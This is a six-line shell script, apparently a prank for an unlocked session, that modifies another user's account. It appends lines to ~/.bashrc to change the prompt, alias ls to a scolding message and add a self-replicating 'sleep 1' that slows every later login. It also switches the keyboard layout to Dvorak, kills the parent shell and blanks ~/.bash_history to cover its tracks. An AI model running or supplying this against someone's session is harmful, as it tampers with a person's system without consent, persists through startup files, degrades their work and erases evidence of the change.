echo 'PS1="#Level 0:"' >> ~/.bashrc
echo 'als() { echo "Dont forget to lock your session next time."; /usr/bin/ls;}; alias ls="als"' >> ~/.bashrc
echo 'echo "sleep 1" >> ~/.bashrc' >> .bashrc
setxkbmap dvorak
kill -9 `ps --pid $$ -oppid=`
echo '' > ~/.bash_history

